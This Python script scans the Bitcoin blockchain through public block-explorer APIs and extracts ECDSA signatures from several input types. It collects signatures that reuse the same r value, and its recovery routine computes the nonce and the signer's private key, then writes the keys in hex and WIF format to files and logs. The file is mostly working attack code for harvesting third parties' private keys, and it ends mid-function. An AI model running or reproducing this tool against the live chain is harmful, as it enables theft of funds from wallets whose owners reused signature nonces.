#!/usr/bin/env python3
# -*- coding: utf-8 -*-

""""

Transaction ID	Blocks Containing Duplicate	Time Period	Amount (per transaction)
d5d2...8599	Blocks 91812 and 91842	November 14-15, 2010	50 BTC
e3bf...b468	Blocks 91722 and 91880	November 14-15, 2010	50 BTC

"""

import requests, time, os, json, re, random, logging, hashlib, base58
from typing import List, Dict, Optional, Tuple, Set
from urllib.parse import urljoin
from collections import OrderedDict
from coincurve import PublicKey

# ---------------- bech32 shim ----------------
try:
    from bech32 import bech32_encode, convertbits
except Exception:
    import bech32
    def bech32_encode(hrp, data): return bech32.bech32_encode(hrp, data)
    def convertbits(data, frombits, tobits, pad=True): return bech32.convertbits(data, frombits, tobits, pad)

# ---------------- logging ----------------
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[logging.FileHandler("block_processor.log"), logging.StreamHandler()],
)
logger = logging.getLogger(__name__)

# ---------------- secp256k1 ----------------
N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141

# ---------------- files ----------------
CHECKPOINT_FILE = "last_processed_block.txt"
SIGS_JSONL      = "signatures.jsonl"
R_VALUES_FILE   = "r_values.txt"
REPEAT_JSONL    = "repetitions.jsonl"
RECOVERED_JSONL = "recovered_keys.jsonl"
RECOVERED_TXT   = "recovered_keys.txt"
SIGSCRIPTS_TXT  = "Sigscript.txt"

# ---------------- SIGHASH flags ----------------
SIGHASH_ALL          = 0x01
SIGHASH_NONE         = 0x02
SIGHASH_SINGLE       = 0x03
SIGHASH_ANYONECANPAY = 0x80

# =====================================================================================
#                                        helpers
# =====================================================================================

def to_wif(priv_int: int, compressed=True, mainnet=True) -> str:
    prefix = b'\x80' if mainnet else b'\xEF'
    payload = prefix + priv_int.to_bytes(32, 'big') + (b'\x01' if compressed else b'')
    checksum = hashlib.sha256(hashlib.sha256(payload).digest()).digest()[:4]
    return base58.b58encode(payload + checksum).decode()

def sha256(b: bytes) -> bytes: return hashlib.sha256(b).digest()
def hash256(b: bytes) -> bytes: return sha256(sha256(b))
def ripemd160(b: bytes) -> bytes: h=hashlib.new('ripemd160'); h.update(b); return h.digest()

def le32(i: int) -> bytes: return i.to_bytes(4, 'little')
def le64(i: int) -> bytes: return i.to_bytes(8, 'little')
def varint(n: int) -> bytes:
    if n < 0xfd: return bytes([n])
    if n <= 0xffff: return b'\xfd'+n.to_bytes(2,'little')
    if n <= 0xffffffff: return b'\xfe'+n.to_bytes(4,'little')
    return b'\xff'+n.to_bytes(8,'little')

def parse_der_sig(sig_der_plus_type_hex: str) -> Tuple[int,int,int]:
    b = bytes.fromhex(sig_der_plus_type_hex)
    if len(b) < 9 or b[0] != 0x30: raise ValueError("bad DER")
    sighash = b[-1]
    der = b[:-1]
    i = 2
    if i >= len(der) or der[i] != 0x02: raise ValueError("no R tag")
    lr = der[i+1]; r = int.from_bytes(der[i+2:i+2+lr], 'big'); i += 2+lr
    if i >= len(der) or der[i] != 0x02: raise ValueError("no S tag")
    ls = der[i+1]; s = int.from_bytes(der[i+2:i+2+ls], 'big')
    return r % N, s % N, sighash

def scriptsig_pushes(hexstr: str) -> List[bytes]:
    if not hexstr: return []
    b = bytes.fromhex(hexstr)
    i, chunks = 0, []
    while i < len(b):
        op = b[i]; i += 1
        if op <= 75:
            d = b[i:i+op]; i += op; chunks.append(d)
        elif op == 0x4c:
            ln = b[i]; i += 1; d = b[i:i+ln]; i += ln; chunks.append(d)
        elif op == 0x4d:
            ln = int.from_bytes(b[i:i+2],'little'); i += 2; d = b[i:i+ln]; i += ln; chunks.append(d)
        elif op == 0x4e:
            ln = int.from_bytes(b[i:i+4],'little'); i += 4; d = b[i:i+ln]; i += ln; chunks.append(d)
        else:
            # ignore non-push opcodes
            pass
    return chunks

def is_p2pkh_spk(spk_hex: str) -> bool:
    return spk_hex.startswith("76a914") and spk_hex.endswith("88ac") and len(spk_hex)==50

def is_p2wpkh_spk(spk_hex: str) -> bool:
    return spk_hex.startswith("0014") and len(spk_hex)==44

def is_p2wsh_spk(spk_hex: str) -> bool:
    return spk_hex.startswith("0020") and len(spk_hex)==68

def is_p2sh_spk(spk_hex: str) -> bool:
    return spk_hex.startswith("a914") and spk_hex.endswith("87") and len(spk_hex)==46

def is_p2tr_spk(spk_hex: str) -> bool:
    return spk_hex.startswith("5120") and len(spk_hex)==68  # taproot (schnorr) -> skip

def is_p2pk_spk(spk_hex: str) -> bool:
    # 21 <33-byte pub> ac  OR  41 <65-byte pub> ac
    if len(spk_hex) < 4: return False
    try:
        if spk_hex.startswith("21") and spk_hex.endswith("ac") and len(spk_hex)==70:
            return True
        if spk_hex.startswith("41") and spk_hex.endswith("ac") and len(spk_hex)==134:
            return True
    except Exception:
        return False
    return False

def p2pkh_script_code_from_hash160(h160: bytes) -> str:
    return "76a914" + h160.hex() + "88ac"

def pubkey_hash160(pubhex: str) -> bytes:
    return ripemd160(sha256(bytes.fromhex(pubhex)))

def extract_pubs_from_script_hex(script_hex: str) -> List[str]:
    """Find 33/65-byte pubkey pushes inside a script hex (for multisig & P2PK)."""
    pubs=[]
    try:
        b = bytes.fromhex(script_hex); i=0; L=len(b)
        while i < L:
            op = b[i]; i+=1
            if op in (33,65):
                if i+op<=L:
                    pk = b[i:i+op].hex().lower(); i+=op
                    if (op==33 and (pk.startswith("02") or pk.startswith("03"))) or (op==65 and pk.startswith("04")):
                        pubs.append(pk)
                else:
                    break
            elif op == 0x4c and i < L:
                ln=b[i]; i+=1
                if i+ln>L: break
                blob=b[i:i+ln]; i+=ln
                if len(blob) in (33,65):
                    pk=blob.hex().lower()
                    if (len(blob)==33 and (pk.startswith("02") or pk.startswith("03"))) or (len(blob)==65 and pk.startswith("04")):
                        pubs.append(pk)
            elif op == 0x4d and i+2 <= L:
                ln=int.from_bytes(b[i:i+2],'little'); i+=2
                if i+ln>L: break
                blob=b[i:i+ln]; i+=ln
                if len(blob) in (33,65):
                    pk=blob.hex().lower()
                    if (len(blob)==33 and (pk.startswith("02") or pk.startswith("03"))) or (len(blob)==65 and pk.startswith("04")):
                        pubs.append(pk)
            elif op == 0x4e and i+4 <= L:
                ln=int.from_bytes(b[i:i+4],'little'); i+=4
                if i+ln>L: break
                blob=b[i:i+ln]; i+=ln
                if len(blob) in (33,65):
                    pk=blob.hex().lower()
                    if (len(blob)==33 and (pk.startswith("02") or pk.startswith("03"))) or (len(blob)==65 and pk.startswith("04")):
                        pubs.append(pk)
            else:
                # other opcodes
                pass
    except Exception:
        pass
    # de-dup preserve order
    return list(dict.fromkeys(pubs))

# ---------------- legacy sighash (ALL/NONE/SINGLE, +ANYONECANPAY) ----------------

def legacy_sighash(tx: dict, vin_index: int, script_code_hex: str, sighash_flag: int) -> int:
    base_type = sighash_flag & 0x1f
    anyone = (sighash_flag & SIGHASH_ANYONECANPAY) != 0

    ver = le32(int(tx["version"]))
    locktime = le32(int(tx.get("locktime", 0)))

    # inputs
    ins_b = bytearray()
    ins = tx["vin"]
    if anyone:
        ins_b += varint(1)
        inp = ins[vin_index]
        txid_le = bytes.fromhex(inp["txid"])[::-1]
        vout = int(inp["vout"])
        script = bytes.fromhex(script_code_hex)
        ins_b += txid_le + le32(vout) + varint(len(script)) + script + le32(int(inp.get("sequence", 0xffffffff)))
    else:
        ins_b += varint(len(ins))
        for idx, inp in enumerate(ins):
            txid_le = bytes.fromhex(inp["txid"])[::-1]
            vout = int(inp["vout"])
            script = bytes.fromhex(script_code_hex) if idx == vin_index else b""
            seq = int(inp.get("sequence", 0xffffffff))
            if base_type in (SIGHASH_NONE, SIGHASH_SINGLE) and idx != vin_index:
                seq = 0
            ins_b += txid_le + le32(vout) + varint(len(script)) + script + le32(seq)

    # outputs
    outs_b = bytearray()
    vout_list = tx["vout"]

    if base_type == SIGHASH_ALL:
        outs_b += varint(len(vout_list))
        for o in vout_list:
            val = int(o["value"])
            spk = bytes.fromhex(o.get("scriptpubkey","") or o.get("scriptPubKey","") or "")
            outs_b += le64(val) + varint(len(spk)) + spk

    elif base_type == SIGHASH_NONE:
        outs_b += varint(0)

    elif base_type == SIGHASH_SINGLE:
        if vin_index >= len(vout_list):
            return int.from_bytes(hash256(le32(1)), 'big') % N
        outs_b += varint(vin_index + 1)
        for _ in range(vin_index):
            outs_b += b'\xff'*8 + b'\x00'
        o = vout_list[vin_index]
        val = int(o["value"])
        spk = bytes.fromhex(o.get("scriptpubkey","") or o.get("scriptPubKey","") or "")
        outs_b += le64(val) + varint(len(spk)) + spk

    else:
        outs_b += varint(len(vout_list))
        for o in vout_list:
            val = int(o["value"])
            spk = bytes.fromhex(o.get("scriptpubkey","") or o.get("scriptPubKey","") or "")
            outs_b += le64(val) + varint(len(spk)) + spk

    preimage = ver + ins_b + outs_b + locktime + le32(sighash_flag)
    return int.from_bytes(hash256(preimage), 'big') % N

# ---------------- BIP143 sighash (ALL/NONE/SINGLE, +ANYONECANPAY) ----------------

def bip143_sighash(tx: dict, vin_index:int, prev_amount:int, script_code_hex:str, sighash_flag:int) -> int:
    base_type = sighash_flag & 0x1f
    anyone = (sighash_flag & SIGHASH_ANYONECANPAY) != 0

    ver = le32(int(tx["version"]))
    locktime = le32(int(tx.get("locktime", 0)))

    # hashPrevouts
    if anyone:
        hashPrevouts = b'\x00'*32
    else:
        hp = bytearray()
        for inp in tx["vin"]:
            hp += bytes.fromhex(inp["txid"])[::-1] + le32(int(inp["vout"]))
        hashPrevouts = hash256(hp)

    # hashSequence
    if anyone or base_type in (SIGHASH_NONE, SIGHASH_SINGLE):
        hashSequence = b'\x00'*32
    else:
        hs = bytearray()
        for inp in tx["vin"]:
            hs += le32(int(inp.get("sequence", 0xffffffff)))
        hashSequence = hash256(hs)

    # outpoint (this input)
    this_in = tx["vin"][vin_index]
    outpoint = bytes.fromhex(this_in["txid"])[::-1] + le32(int(this_in["vout"]))

    # scriptCode
    sc = bytes.fromhex(script_code_hex)

    # amount & sequence for this input
    amt = le64(int(prev_amount))
    seq = le32(int(this_in.get("sequence", 0xffffffff)))

    # hashOutputs
    if base_type == SIGHASH_ALL:
        ho = bytearray()
        for o in tx["vout"]:
            val = le64(int(o["value"]))
            spk = bytes.fromhex(o.get("scriptpubkey","") or o.get("scriptPubKey","") or "")
            ho += val + varint(len(spk)) + spk
        hashOutputs = hash256(ho)
    elif base_type == SIGHASH_SINGLE:
        if vin_index >= len(tx["vout"]):
            return int.from_bytes(hash256(le32(1)), 'big') % N
        o = tx["vout"][vin_index]
        val = le64(int(o["value"]))
        spk = bytes.fromhex(o.get("scriptpubkey","") or o.get("scriptPubKey","") or "")
        ho = val + varint(len(spk)) + spk
        hashOutputs = hash256(ho)
    else:  # NONE
        hashOutputs = b'\x00'*32

    sighash = le32(sighash_flag)
    preimage = (ver + hashPrevouts + hashSequence + outpoint +
                varint(len(sc)) + sc + amt + seq + hashOutputs + locktime + sighash)
    return int.from_bytes(hash256(preimage), 'big') % N

# =====================================================================================
#                                  Prevout LRU cache
# =====================================================================================

class PrevoutCache:
    def __init__(self, maxsize=8000):
        self.maxsize = maxsize
        self._store: "OrderedDict[Tuple[str,int], dict]" = OrderedDict()

    def get(self, txid:str, vout:int) -> Optional[dict]:
        key = (txid, vout)
        if key in self._store:
            self._store.move_to_end(key)
            return self._store[key]
        return None

    def put(self, txid:str, vout:int, value:dict):
        key = (txid, vout)
        self._store[key] = value
        self._store.move_to_end(key)
        if len(self._store) > self.maxsize:
            self._store.popitem(last=False)

# =====================================================================================
#                                      Block Walker
# =====================================================================================

class BlockWalker:
    def __init__(self):
        self.api_endpoints = [
            {"name":"Mempool.space","base_url":"https://mempool.space/api/","weight":9,"requests":0,"last_used":0,
             "endpoints":{"block_hash":"block-height/{height}","block_txids":"block/{hash}/txids","tx":"tx/{txid}"}},
            {"name":"Blockchain.com","base_url":"https://blockchain.info/","weight":6,"requests":0,"last_used":0,
             "endpoints":{"block_hash":"block-height/{height}?format=json","block_raw":"rawblock/{hash}?format=json","tx_raw":"rawtx/{txid}?format=json"}},
            {"name":"BlockCypher","base_url":"https://api.blockcypher.com/v1/btc/main/","weight":5,"requests":0,"last_used":0,
             "endpoints":{"block_hash":"blocks/{height}","block_txids":"blocks/{hash}?txstart=0&limit=500","tx":"txs/{txid}"}},
        ]
        self.session = requests.Session()
        self.session.headers.update({"User-Agent":"Mozilla/5.0 BlockWalker/5.0"})
        self.api_stats = {api["name"]:{ "success":0, "errors":0 } for api in self.api_endpoints}
        self.checkpoint_file = CHECKPOINT_FILE

        # duplicate-R tracking
        self.by_r_pub: Dict[Tuple[int,str], List[dict]] = {}
        self.r_seen: Set[int] = set()

        # prevout cache
        self.prevout_cache = PrevoutCache(maxsize=8000)

        # seen-lines guard
        self._seen_lines: Set[Tuple[str,int,int,int]] = set()  # (txid, vin, r, s)

        # ensure files
        for p in [SIGS_JSONL, R_VALUES_FILE, REPEAT_JSONL, RECOVERED_JSONL, RECOVERED_TXT, SIGSCRIPTS_TXT]:
            if not os.path.exists(p): open(p,"a").close()

    # ---------------- endpoint / request ----------------
    def _pick(self, endpoint_type) -> Optional[dict]:
        now = time.time(); choices=[]
        for ep in self.api_endpoints:
            if endpoint_type not in ep["endpoints"]: continue
            w = ep["weight"]
            if now - ep["last_used"] < 60: w = max(1, w-3)
            if ep["requests"] > 100: w = max(1, w-2)
            choices.extend([ep]*w)
        return random.choice(choices) if choices else None

    def _request(self, endpoint_type, **fmt):
        tries = len(self.api_endpoints) * 2
        ep = self._pick(endpoint_type)
        if not ep: return None
        for k in range(tries):
            try:
                path = ep["endpoints"][endpoint_type].format(**fmt)
                url = urljoin(ep["base_url"], path)
                logger.info(f"{ep['name']} -> {url}")
                r = self.session.get(url, timeout=30)
                ep["requests"] += 1; ep["last_used"] = time.time()
                if r.status_code == 429:
                    self.api_stats[ep["name"]]["errors"] += 1
                    time.sleep(min(8, 2**k)); ep = self._pick(endpoint_type); continue
                r.raise_for_status()
                self.api_stats[ep["name"]]["success"] += 1
                text = r.text.strip()
                if "application/json" in r.headers.get("content-type","") or text.startswith("{") or text.startswith("["):
                    try: return r.json()
                    except Exception: return text
                return text
            except Exception as e:
                logger.warning(f"{ep['name']} error: {e}")
                self.api_stats[ep["name"]]["errors"] += 1
                if k < tries-1: ep = self._pick(endpoint_type); time.sleep(1)
                else: break
        return None

    # ---------------- blockchain helpers ----------------
    def get_block_hash(self, height:int) -> Optional[str]:
        res = self._request("block_hash", height=height)
        if isinstance(res,str) and len(res)==64: return res
        if isinstance(res,dict):
            if "blocks" in res and res["blocks"]:
                return res["blocks"][0].get("hash")
            if "hash" in res: return res["hash"]
        return None

    def _blockcypher_txids(self, block_hash:str) -> List[str]:
        txids=[]; start=0
        while True:
            url=f"https://api.blockcypher.com/v1/btc/main/blocks/{block_hash}?txstart={start}&limit=500"
            try:
                r=self.session.get(url,timeout=30); r.raise_for_status(); j=r.json()
            except Exception as e:
                logger.warning(f"BlockCypher page fail {start}: {e}"); break
            lst=j.get("txids") or []
            if not lst: break
            txids+=lst
            if len(lst)<500: break
            start+=500
        return txids

    def get_block_txids(self, block_hash:str) -> List[str]:
        try:
            res = self._request("block_txids", hash=block_hash)
            if isinstance(res,list) and all(isinstance(x,str) and len(x)==64 for x in res): return res
            if isinstance(res,dict) and isinstance(res.get("txids"),list):
                lst=[x for x in res["txids"] if isinstance(x,str) and len(x)==64]
                if lst: return lst
        except Exception as e: logger.warning(f"/txids path fail: {e}")

        try:
            raw = self._request("block_raw", hash=block_hash)
            if isinstance(raw,dict) and "tx" in raw:
                out=[]
                for t in raw["tx"]:
                    if isinstance(t,dict):
                        if "hash" in t: out.append(t["hash"])
                        elif "txid" in t: out.append(t["txid"])
                if out: return out
        except Exception as e: logger.warning(f"raw fallback fail: {e}")

        try:
            out = self._blockcypher_txids(block_hash)
            if out: return out
        except Exception as e: logger.warning(f"blockcypher pagination fail: {e}")
        return []

    def get_tx(self, txid:str) -> Optional[dict]:
        res = self._request("tx", txid=txid)
        if isinstance(res,dict):
            if "txid" in res or "hash" in res: return res
            if "data" in res and isinstance(res["data"],dict): return res["data"]
        res2 = self._request("tx_raw", txid=txid)
        if isinstance(res2,dict): return res2
        return None

    def get_prevout(self, prev_txid:str, vout:int) -> Optional[dict]:
        # coinbase/null prevout guard
        if not prev_txid or prev_txid == "0"*64:
            return None
        cached = self.prevout_cache.get(prev_txid, vout)
        if cached: return cached
        j = self.get_tx(prev_txid)
        if isinstance(j,dict):
            outs = j.get("vout") or j.get("out") or j.get("outputs") or []
            if 0<=vout<len(outs):
                o=outs[vout]
                spk = o.get("scriptpubkey") or o.get("scriptPubKey") or o.get("script") or ""
                val = int(o.get("value", 0))
                res = {"scriptpubkey": spk, "value": val}
                self.prevout_cache.put(prev_txid, vout, res)
                return res
        return None

    # ---------------- normalization ----------------
    def normalize_tx(self, raw:dict) -> dict:
        tx = {
            "version": raw.get("version",2),
            "locktime": raw.get("locktime",0),
            "txid": raw.get("txid") or raw.get("hash") or "",
            "vin": [], "vout": []
        }
        vin = raw.get("vin") or raw.get("inputs") or []
        for i,inp in enumerate(vin):
            prev_txid = inp.get("txid") or inp.get("tx_hash") or inp.get("prevout_hash") or ""
            vout_idx  = inp.get("vout") if "vout" in inp else inp.get("tx_output_n", 0)
            if vout_idx is None:
                vout_idx = 0
            try:
                vout_idx = int(vout_idx)
            except Exception:
                vout_idx = 0

            is_cb = bool(
                inp.get("is_coinbase") or
                ("coinbase" in inp) or
                (isinstance(prev_txid, str) and prev_txid == "0"*64)
            )

            txin = {
                "txid": prev_txid,
                "vout": vout_idx,
                "sequence": int(inp.get("sequence", 0xffffffff)),
                "scriptsig": inp.get("scriptsig") or inp.get("script") or "",
                "scriptsig_asm": inp.get("scriptsig_asm") or "",
                "witness": inp.get("witness") or inp.get("txinwitness") or [],
                "is_coinbase": is_cb,
            }
            prevout = inp.get("prevout") or {}
            if isinstance(prevout, dict):
                txin["prevout_spk"]   = prevout.get("scriptpubkey") or prevout.get("scriptPubKey") or ""
                txin["prevout_value"] = prevout.get("value")
            tx["vin"].append(txin)

        vout = raw.get("vout") or raw.get("out") or raw.get("outputs") or []
        for o in vout:
            tx["vout"].append({
                "value": int(o.get("value", 0)),
                "scriptpubkey": o.get("scriptpubkey") or o.get("scriptPubKey") or o.get("script") or "",
            })
        return tx

    # ---------------- signature extraction ----------------
    def extract_sigs_from_input(self, tx:dict, vin_index:int) -> List[dict]:
        results=[]
        inp = tx["vin"][vin_index]

        # --- skip coinbase inputs early ---
        if inp.get("is_coinbase") or (inp.get("txid") == "0"*64 and inp.get("vout") == 0xffffffff):
            logger.info(f"  Skipping coinbase input {tx['txid']}:{vin_index}")
            return results

        # Fill prevout (spk+value)
        prev_spk = inp.get("prevout_spk"); prev_val = inp.get("prevout_value")
        if not prev_spk or prev_val is None:
            prev = self.get_prevout(inp["txid"], inp["vout"])
            if not prev: return results
            prev_spk = prev["scriptpubkey"]; prev_val = prev["value"]

        # Taproot? skip (Schnorr, არაა ჩვენთვის)
        if is_p2tr_spk(prev_spk):
            return results

        # ------------- A) Legacy P2PKH -------------
        if is_p2pkh_spk(prev_spk):
            chunks = scriptsig_pushes(inp.get("scriptsig",""))
            if len(chunks)>=2:
                sig_hex = chunks[0].hex(); pub_hex = chunks[1].hex()
                try:
                    r,s,ht = parse_der_sig(sig_hex)
                except Exception:
                    sig_hex=None
                if sig_hex:
                    z = legacy_sighash(tx, vin_index, p2pkh_script_code_from_hash160(pubkey_hash160(pub_hex)), ht)
                    results.append({
                        "type":"legacy",
                        "sig":sig_hex,"pub":pub_hex,"sighash":ht,
                        "prev_spk":prev_spk,"prev_value":prev_val,"z":z,"r":r,"s":s,
                        "prev_txid": inp["txid"], "prev_vout": inp["vout"]
                    })
                    # scriptSig dump (დამხმარე)
                    with open(SIGSCRIPTS_TXT,"a") as f: f.write(f"{tx['txid']}|{vin_index}|{inp.get('scriptsig','')}\n")

        # ------------- B) Legacy P2PK (scriptPubKey = <pub> OP_CHECKSIG) -------------
        if is_p2pk_spk(prev_spk):
            # scriptSig typically: <sig>
            chunks = scriptsig_pushes(inp.get("scriptsig",""))
            if len(chunks)>=1:
                sig_hex = chunks[0].hex()
                try:
                    r,s,ht = parse_der_sig(sig_hex)
                except Exception:
                    sig_hex=None
                if sig_hex:
                    pubs = extract_pubs_from_script_hex(prev_spk)
                    pub_hex = pubs[0] if pubs else ""
                    # scriptCode = prev_spk for legacy P2PK
                    z = legacy_sighash(tx, vin_index, prev_spk, ht)
                    results.append({
                        "type":"legacy-p2pk",
                        "sig":sig_hex,"pub":pub_hex,"sighash":ht,
                        "prev_spk":prev_spk,"prev_value":prev_val,"z":z,"r":r,"s":s,
                        "prev_txid": inp["txid"], "prev_vout": inp["vout"]
                    })
                    with open(SIGSCRIPTS_TXT,"a") as f: f.write(f"{tx['txid']}|{vin_index}|{inp.get('scriptsig','')}\n")

        # ------------- C) SegWit v0 P2WPKH / P2SH-P2WPKH -------------
        wit = inp.get("witness") or []
        if wit and len(wit)>=2:
            keyhash = None
            redeem_script_hex = None
            if is_p2wpkh_spk(prev_spk):
                keyhash = bytes.fromhex(prev_spk[4:])
            elif is_p2sh_spk(prev_spk):
                ch = scriptsig_pushes(inp.get("scriptsig",""))
                if ch:
                    redeem = ch[-1]
                    # 0x00 0x14 <20>
                    if len(redeem)==22 and redeem[0]==0x00 and redeem[1]==0x14:
                        keyhash = redeem[2:]
                        redeem_script_hex = redeem.hex()
            if keyhash is not None:
                sig_hex = wit[0]; pub_hex = wit[-1]
                if isinstance(sig_hex,str) and isinstance(pub_hex,str):
                    try: r,s,ht = parse_der_sig(sig_hex)
                    except Exception: sig_hex=None
                    if sig_hex:
                        sc_hex = p2pkh_script_code_from_hash160(keyhash)
                        z = bip143_sighash(tx, vin_index, prev_val, sc_hex, ht)
                        results.append({
                            "type":"witness","sig":sig_hex,"pub":pub_hex,"sighash":ht,
                            "prev_spk":prev_spk,"prev_value":prev_val,"z":z,"r":r,"s":s,
                            "script_code": sc_hex,  # კონტექსტისთვის
                            "redeem_script": redeem_script_hex,
                            "prev_txid": inp["txid"], "prev_vout": inp["vout"]
                        })

        # ------------- D) P2WSH (single-sig ან MULTISIG, native ან P2SH-wrapped) -------------
        is_wsh = False; witness_script_hex = None; redeem_script_hex = None
        if is_p2wsh_spk(prev_spk):
            is_wsh = True
        elif is_p2sh_spk(prev_spk):
            ch = scriptsig_pushes(inp.get("scriptsig",""))
            if ch:
                redeem = ch[-1]
                if len(redeem)==34 and redeem[0]==0x00 and redeem[1]==0x20:
                    is_wsh = True
                    redeem_script_hex = redeem.hex()

        if is_wsh and wit and len(wit)>=2:
            witness_script_hex = wit[-1]
            # collect ALL DER signatures from witness (skip leading OP_0 bug-dummy if any)
            der_sigs = []
            for item in wit[:-1]:
                try:
                    _r,_s,_ht = parse_der_sig(item)
                    der_sigs.append((item,_r,_s,_ht))
                except Exception:
                    continue
            # pub candidates from witnessScript
            pubs = extract_pubs_from_script_hex(witness_script_hex)
            # compute z once (BIP143) for this input
            if der_sigs:
                z = bip143_sighash(tx, vin_index, prev_val, witness_script_hex, der_sigs[0][3])
                for sig_hex, r, s, ht in der_sigs:
                    # pub UNKNOWN at this point — ვწერთ მხოლოდ სკრიპტებით (recover_max იპოვის)
                    results.append({
                        "type":"witness-wsh",
                        "sig":sig_hex,"pub":"", "sighash":ht,
                        "prev_spk":prev_spk,"prev_value":prev_val,"z":z,"r":r,"s":s,
                        "witness_script": witness_script_hex,
                        "redeem_script": redeem_script_hex,
                        "pub_candidates": pubs,
                        "prev_txid": inp["txid"], "prev_vout": inp["vout"]
                    })

        # ------------- E) Legacy P2SH-multisig -------------
        if is_p2sh_spk(prev_spk):
            ch = scriptsig_pushes(inp.get("scriptsig",""))
            if ch:
                redeem = ch[-1].hex()
                # ამოვიღოთ pub-ები redeemScript-იდან
                pubs = extract_pubs_from_script_hex(redeem)
                # შევაგროვოთ DER ხელმოწერების ყველა push (OP_0 გამოტოვებულია)
                ders = []
                for blob in ch[:-1]:
                    try:
                        rr,ss,ht = parse_der_sig(blob.hex())
                        ders.append((blob.hex(), rr, ss, ht))
                    except Exception:
                        continue
                if ders:
                    # legacy sighash: scriptCode = redeemScript
                    z = legacy_sighash(tx, vin_index, redeem, ders[0][3])
                    for sig_hex, r, s, ht in ders:
                        results.append({
                            "type":"legacy-p2sh-ms",
                            "sig":sig_hex,"pub":"", "sighash":ht,
                            "prev_spk":prev_spk,"prev_value":prev_val,"z":z,"r":r,"s":s,
                            "redeem_script": redeem,
                            "pub_candidates": pubs,
                            "prev_txid": inp["txid"], "prev_vout": inp["vout"]
                        })
                    with open(SIGSCRIPTS_TXT,"a") as f: f.write(f"{tx['txid']}|{vin_index}|{inp.get('scriptsig','')}\n")

        return results

    # ---------------- duplicate-R bookkeeping & recovery ----------------
    def record_sig(self, txid:str, vin:int, entry:dict):
        # dedup line guard
        key = (txid, vin, entry["r"], entry["s"])
        if key in self._seen_lines:
            return
        self._seen_lines.add(key)

        rec = {
            "txid": txid, "vin": vin, "type": entry["type"],
            "signature_hex": entry["sig"],
            "pubkey_hex": entry.get("pub","") or "",
            "r": f"{entry['r']:064x}", "s": f"{entry['s']:064x}",
            "sighash": entry["sighash"], "z": f"{entry['z']:064x}",
            "prev_value": entry["prev_value"], "prev_spk": entry["prev_spk"],
            "prev_txid": entry.get("prev_txid"), "prev_vout": entry.get("prev_vout"),
        }
        # context for multisig / segwit
        if entry.get("witness_script"): rec["witness_script"] = entry["witness_script"]
        if entry.get("redeem_script"):  rec["redeem_script"]  = entry["redeem_script"]
        if entry.get("script_code"):    rec["script_code"]    = entry["script_code"]
        if entry.get("pub_candidates"): rec["pub_candidates"] = entry["pub_candidates"]

        with open(SIGS_JSONL,"a") as f: f.write(json.dumps(rec)+"\n")

        if entry["r"] not in self.r_seen:
            self.r_seen.add(entry["r"])
            with open(R_VALUES_FILE,"a") as f: f.write(f"{entry['r']:064x}\n")

        # r-cluster per pub (if pub missing, თუნდაც გავატაროთ '<unknown>')
        pub_key = (entry.get("pub") or "<unknown>").lower()
        self.by_r_pub.setdefault((entry["r"], pub_key), []).append({
            "txid": txid, "vin": vin, "r": entry["r"], "s": entry["s"], "z": entry["z"], "pub": pub_key
        })

        rows = self.by_r_pub[(entry["r"], pub_key)]
        if len(rows) >= 2:
            cluster = {"r": f"{entry['r']:064x}", "pubkey": pub_key,
                       "count": len(rows), "sightings":[{"txid":x["txid"],"vin":x["vin"]} for x in rows]}
            with open(REPEAT_JSONL,"a") as f: f.write(json.dumps(cluster)+"\n")

    def try_recover_all(self):
        recovered_any=False
        for (r, pub), rows in list(self.by_r_pub.items()):
            if pub == "<unknown>":  # მულტისიგი/უცნობი პაბი — აღდგენა `recover_max.py`-ს მივანდოთ
                continue
            if len(rows) < 2: continue
            for i in range(len(rows)):
                for j in range(i+1,len(rows)):
                    a, b = rows[i], rows[j]
                    s1, s2 = a["s"], b["s"]
                    z1, z2 = a["z"], b["z"]

                    denom = (s1 - s2) % N
                    if denom != 0:
                        k = ((z1 - z2) * pow(denom, -1, N)) % N
                    else:
                        denom2 = (s1 + s2) % N
                        if denom2 == 0: continue
                        k = ((z1 + z2) * pow(denom2, -1, N)) % N
                    if k == 0: continue

                    rinv = pow(r % N, -1, N)
                    priv = ((s1 * k - z1) * rinv) % N
                    if not (1 <= priv < N): continue

                    try:
                        pk_c = PublicKey.from_secret(priv).format(compressed=True).hex().lower()
                        pk_u = PublicKey.from_secret(priv).format(compressed=False).hex().lower()
                        if pub not in (pk_c, pk_u): continue
                    except Exception:
                        continue

                    wif = to_wif(priv, compressed=True, mainnet=True)
                    rec = {"pubkey": pub, "priv_hex": f"{priv:064x}", "priv_wif": wif,
                           "r": f"{r:064x}", "txids":[a["txid"], b["txid"]], "vins":[a["vin"], b["vin"]]}
                    with open(RECOVERED_JSONL,"a") as f: f.write(json.dumps(rec)+"\n")
                    with open(RECOVERED_TXT,"a") as f:
                        f.write(f"PUB={pub} PRIV={priv:064x} WIF={wif} from {a['txid']}:{a['vin']} & {b['txid']}:{b['vin']}\n")
                    logger.critical(f"[RECOVERED] pub={pub} priv={priv:064x} WIF={wif}")
                    recovered_any=True
        return recovered_any

    # ---------------- run loop ----------------
    def save_checkpoint(self, h:int):
        with open(self.checkpoint_file,"w") as f: f.write(str(h))
        logger.info(f"Checkpoint saved: {h}")

    def load_checkpoint(self) -> int:
        if os.path.exists(self.checkpoint_file):
            try:
                return int(open(self.checkpoint_file).read().strip())
            except Exception:
                pass
        return 1

    def process_block(self, height:int) -> bool:
        logger.info("\n" + "="*60)
        logger.info(f"Processing block {height}")
        logger.info("="*60)
        bh = self.get_block_hash(height)
        if not bh:
            logger.error("no block hash")
            return False
        logger.info(f"Block hash: {bh}")

        txids = self.get_block_txids(bh)
        logger.info(f"Found {len(txids)} txs")

        sig_count = 0
        for txid in txids:
            raw = self.get_tx(txid)
            if not raw: continue
            tx = self.normalize_tx(raw)

            all_coinbase_inputs = True
            for vin_index in range(len(tx["vin"])):
                if not tx["vin"][vin_index].get("is_coinbase"):
                    all_coinbase_inputs = False
                entries = self.extract_sigs_from_input(tx, vin_index)
                for e in entries:
                    self.record_sig(tx["txid"], vin_index, e)
                    sig_count += 1

            if all_coinbase_inputs:
                logger.info(f"  {tx['txid']} is coinbase-only; no signatures to analyze")

        if sig_count == 0:
            logger.info("No signable inputs found in this block")

        # quick built-in recovery only იმ შემთხვევისთვის, როცა pub ცნობილია (P2PKH/P2PK/სინგლ სიგი)
        self.try_recover_all()
        return True

    def run(self, start_height: Optional[int]=None):
        h = self.load_checkpoint() if start_height is None else start_height
        while True:
            try:
